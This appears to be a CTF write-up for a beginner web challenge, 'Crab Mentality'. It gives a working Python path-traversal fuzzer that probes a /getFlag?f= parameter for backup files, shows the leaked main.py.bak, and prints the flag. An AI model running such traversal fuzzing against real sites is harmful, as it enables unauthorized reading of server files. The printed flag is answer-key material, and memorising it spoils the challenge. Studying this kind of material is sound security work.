---
title: "Crab Mentality"
date: 2026-03-19T02:16:37+05:30
tags: ["beginner"]
categories: ["web"]
authors: ['curious_codist']
description: "Nah I'd bruteforce"
---

# Crab Mentality

<!-- DESCRIPTION -->
> This challenge is sort of breaking the fourth wall in the sense that we're gonna openly acknowledge what it is you're looking for--the flag--which you can get if you wait. And only if everyone else waits. Have patience.

points: `584`

solves: `190`

handouts: ```challenge.utctf.live:5888```(likely would go down tho..)

author: `@emdawg25`

---

## Solution

I dont even know what to write in this one cuz all I did was fuzz out some file paths..
There is a comment in ```/```  :- 
```html
<!-- future: rollback old style of site + server code from backup files -->
``` 
The flag comes from a request to a file path like this ```/getFlag?f=flag.txt```

So, I thought I could hypothetically get the backup files by just bruteforcing possible backup paths. And I did just that and guess
what, I found it on ```/getFlag?f=../main.py.bak```
Here's my bruteforce code and the output.

---

## Code and output
### Code
```python
import requests
import sys
import time
TARGET_URL = "http://challenge.utctf.live:5888"

def fuzz_lfi_backups():
    print(f"Starting LFI Backup Fuzzer against {TARGET_URL}")
    traversals = ['', '../', '../../', '/app/']
    base_files = ['main.py', 'app.py', 'server.js', 'index.js', 'flag.txt']
    extensions = ['.bak', '.old', '~', '.swp', '.backup']
    payloads = []
    for t in traversals:
        for f in base_files:
            payloads.append(f"{t}{f}")
            for ext in extensions:
                payloads.append(f"{t}{f}{ext}")

    print(f"Generated {len(payloads)} payloads. Initiating fuzzing sequence...\n")

    for payload in payloads:
        target = f"{TARGET_URL}/getFlag?f={payload}"
        try:
            res = requests.get(target, timeout=3)
            if res.status_code == 200:
                text = res.text
                print(text)
                print(target)
            time.sleep(0.1)
        except requests.exceptions.RequestException as e:
            print(f"[!] Network error on payload {payload}: {e}")
            sys.exit(1)

fuzz_lfi_backups()

```
### Output

```python
Starting LFI Backup Fuzzer against http://challenge.utctf.live:5888
Generated 120 payloads. Initiating fuzzing sequence...

import base64

_d = [
    0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x79,
    0x30, 0x75, 0x5f, 0x65, 0x31, 0x74, 0x68, 0x33,
    0x72, 0x5f, 0x77, 0x40, 0x31, 0x74, 0x5f, 0x79,
    0x72, 0x5f, 0x74, 0x75, 0x72, 0x6e, 0x5f, 0x30,
    0x72, 0x5f, 0x63, 0x75, 0x74, 0x5f, 0x31, 0x6e,
    0x5f, 0x6c, 0x31, 0x6e, 0x65, 0x7d
]

_k = base64.b64decode("U2VjcmV0S2V5MTIz").decode()

_x = bytes([
    c ^ ord(_k[i % len(_k)])
    for i, c in enumerate(_d)
]).hex()

if __name__ == "__main__":
    raw = bytes(
        int(_x[i:i+2], 16) ^ ord(_k[i // 2 % len(_k)])
        for i in range(0, len(_x), 2)
    )
    print(raw.decode())
http://challenge.utctf.live:5888/getFlag?f=../main.py.bak
```

---
## Final steps

Running the above python code, we immediately get the flag.

Btw, while writing this challenge, I literally waited 5 mins for the flag and the server gave me it. So ig, if everyone waited, everyone could have gotten the flag. smtg about world peace smtg smtg.

```
utflag{y0u_e1th3r_w@1t_yr_turn_0r_cut_1n_l1ne}
```

---
